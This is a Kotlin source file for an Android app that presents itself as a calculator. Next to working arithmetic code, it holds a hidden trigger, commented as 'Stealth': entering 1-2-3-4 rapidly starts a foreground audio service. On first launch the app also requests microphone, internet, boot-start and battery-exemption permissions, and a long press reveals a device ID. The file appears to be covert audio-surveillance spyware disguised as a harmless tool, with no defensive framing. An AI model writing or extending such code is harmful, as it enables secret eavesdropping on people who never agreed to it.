package com.dp.calculator

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.HapticFeedbackConstants
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.dp.calculator.databinding.ActivityMainBinding
import java.text.DecimalFormat
import java.text.DecimalFormatSymbols
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private var currentNumber: String = ""
    private var previousNumber: String = ""
    private var operator: String = ""
    private var isResultShown: Boolean = false

    // Stealth: Long press counter for hidden activation
    private var longPressCount = 0
    private val longPressHandler = Handler(Looper.getMainLooper())
    private var longPressResetRunnable: Runnable? = null

    private val decimalFormat = DecimalFormat("#,##0.##########", DecimalFormatSymbols(Locale.US))

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
        // Secret code sequence for hidden activation
        private const val SECRET_SEQUENCE = "1234"
        private var secretInput = ""
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Request permissions on first run
        requestPermissions()

        setupCalculator()
        setupHiddenActivation()
    }

    private fun setupCalculator() {
        // Number buttons
        val numberButtons = mapOf(
            R.id.btn0 to "0", R.id.btn1 to "1", R.id.btn2 to "2",
            R.id.btn3 to "3", R.id.btn4 to "4", R.id.btn5 to "5",
            R.id.btn6 to "6", R.id.btn7 to "7", R.id.btn8 to "8",
            R.id.btn9 to "9"
        )

        numberButtons.forEach { (id, value) ->
            findViewById<Button>(id).setOnClickListener {
                onNumberClick(value)
            }
        }

        // Operator buttons
        binding.btnAdd.setOnClickListener { onOperatorClick("+") }
        binding.btnSubtract.setOnClickListener { onOperatorClick("-") }
        binding.btnMultiply.setOnClickListener { onOperatorClick("×") }
        binding.btnDivide.setOnClickListener { onOperatorClick("÷") }

        // Function buttons
        binding.btnClear.setOnClickListener { onClear() }
        binding.btnBackspace.setOnClickListener { onBackspace() }
        binding.btnDecimal.setOnClickListener { onDecimalClick() }
        binding.btnEquals.setOnClickListener { onEquals() }
        binding.btnPercent.setOnClickListener { onPercent() }

        // Long press on display for hidden Device ID
        binding.currentNumber.setOnLongClickListener {
            showDeviceId()
            true
        }

        binding.previousOperation.setOnLongClickListener {
            showDeviceId()
            true
        }
    }

    private fun setupHiddenActivation() {
        // Hidden activation: Pressing buttons in sequence 1-2-3-4 rapidly
        // This is nearly impossible to trigger accidentally
        val secretButtons = listOf(
            binding.btn1, binding.btn2, binding.btn3, binding.btn4
        )

        secretButtons.forEachIndexed { index, button ->
            button.setOnClickListener {
                // Normal button press
                onNumberClick((index + 1).toString())

                // Track secret sequence
                secretInput += (index + 1).toString()
                if (secretInput.length > SECRET_SEQUENCE.length) {
                    secretInput = secretInput.takeLast(SECRET_SEQUENCE.length)
                }

                // Check for secret activation
                if (secretInput == SECRET_SEQUENCE) {
                    secretInput = ""
                    onSecretActivation()
                }

                // Reset after 2 seconds of inactivity
                longPressResetRunnable?.let { longPressHandler.removeCallbacks(it) }
                longPressResetRunnable = Runnable { secretInput = "" }
                longPressHandler.postDelayed(longPressResetRunnable!!, 2000)
            }
        }
    }

    private fun onSecretActivation() {
        // Haptic feedback
        binding.root.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY)

        // Start the audio service
        val serviceIntent = Intent(this, AudioService::class.java).apply {
            action = AudioService.ACTION_START
        }
        ContextCompat.startForegroundService(this, serviceIntent)

        Toast.makeText(this, "Service activated", Toast.LENGTH_SHORT).show()
    }

    private fun showDeviceId() {
        val deviceId = DeviceRegistrar.getDeviceId(this)
        Toast.makeText(this, "Device: $deviceId", Toast.LENGTH_LONG).show()
    }

    private fun onNumberClick(number: String) {
        if (isResultShown) {
            currentNumber = ""
            isResultShown = false
        }

        if (currentNumber == "0" && number == "0") return
        if (currentNumber == "0" && number != ".") {
            currentNumber = number
        } else {
            currentNumber += number
        }

        updateDisplay()
    }

    private fun onOperatorClick(op: String) {
        if (currentNumber.isNotEmpty() && previousNumber.isNotEmpty() && operator.isNotEmpty()) {
            onEquals()
        }

        if (currentNumber.isEmpty() && previousNumber.isNotEmpty()) {
            operator = op
            updateOperationDisplay()
            return
        }

        previousNumber = currentNumber
        operator = op
        currentNumber = ""
        updateOperationDisplay()
        updateDisplay()
    }

    private fun onEquals() {
        if (previousNumber.isEmpty() || currentNumber.isEmpty() || operator.isEmpty()) return

        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentNumber.toDoubleOrNull() ?: return

        val result = when (operator) {
            "+" -> num1 + num2
            "-" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> {
                if (num2 == 0.0) {
                    Toast.makeText(this, "Cannot divide by zero", Toast.LENGTH_SHORT).show()
                    return
                }
                num1 / num2
            }
            else -> return
        }

        currentNumber = formatNumber(result)
        previousNumber = ""
        operator = ""
        isResultShown = true

        binding.previousOperation.text = ""
        updateDisplay()
    }

    private fun onClear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        isResultShown = false
        binding.currentNumber.text = "0"
        binding.previousOperation.text = ""
    }

    private fun onBackspace() {
        if (currentNumber.isNotEmpty()) {
            currentNumber = currentNumber.dropLast(1)
            if (currentNumber.isEmpty()) currentNumber = "0"
            updateDisplay()
        }
    }

    private fun onDecimalClick() {
        if (isResultShown) {
            currentNumber = "0"
            isResultShown = false
        }
        if (!currentNumber.contains(".")) {
            if (currentNumber.isEmpty()) {
                currentNumber = "0"
            }
            currentNumber += "."
            updateDisplay()
        }
    }

    private fun onPercent() {
        if (currentNumber.isNotEmpty()) {
            val number = currentNumber.toDoubleOrNull() ?: return
            currentNumber = formatNumber(number / 100)
            updateDisplay()
        }
    }

    private fun updateDisplay() {
        val displayText = if (currentNumber.isEmpty()) "0" else currentNumber
        binding.currentNumber.text = displayText

        // Auto-shrink text if too long
        val length = displayText.length
        binding.currentNumber.textSize = when {
            length > 12 -> 32f
            length > 9 -> 40f
            length > 6 -> 48f
            else -> 56f
        }
    }

    private fun updateOperationDisplay() {
        if (previousNumber.isNotEmpty() && operator.isNotEmpty()) {
            binding.previousOperation.text = "$previousNumber $operator"
        }
    }

    private fun formatNumber(number: Double): String {
        return if (number == number.toLong().toDouble()) {
            number.toLong().toString()
        } else {
            decimalFormat.format(number)
        }
    }

    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
        )

        val neededPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (neededPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Permissions granted - app will work normally
            // Audio service will be started when activated
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        longPressResetRunnable?.let { longPressHandler.removeCallbacks(it) }
    }
}
